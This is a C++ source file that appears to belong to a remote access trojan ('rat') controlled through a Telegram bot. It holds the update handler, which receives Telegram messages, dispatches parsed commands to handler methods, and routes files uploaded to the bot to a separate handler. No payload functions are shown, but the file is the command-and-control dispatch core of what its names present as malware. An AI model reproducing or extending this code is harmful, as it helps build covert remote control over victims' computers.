/*rat_handler/src/handleUpdate.cpp*/
#include "rat/system.hpp"
#include "rat/Handler.hpp"
#include <algorithm>

#include <cstdint>
#include <filesystem>
#include <optional>
#include "logging.hpp"
#include "rat/networking.hpp"

namespace rat::handler{

// Dispatch method
void Handler::dispatch() {
    // Parse once and store in class member for handlers that need it
    DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update.id);
    command = parseTelegramMessageToCommand();
    
    for (const auto& handler : command_map) {
        if (command.directive == handler.command) {
            (this->*handler.handler)();
            return;
        }
    }
    // Handle unknown command
    this->bot.sendMessage(fmt::format("Unknown command: {}", command.directive));
}


// Handle Telegram update
void Handler::handleUpdate(rat::tbot::Update&& arg_Update) {
    this->telegram_update = std::move(arg_Update);
    
    if(this->telegram_update.message.id == 0) {
        DEBUG_LOG("Empty Update");
        return;
    }
    if(!this->telegram_update.message.files.empty()) {
        DEBUG_LOG("Handling uploaded files to the bot");
        this->handleMessageWithUploadedFiles();
        return;
    } 
    this->dispatch();
}

} // namespace rat::handler
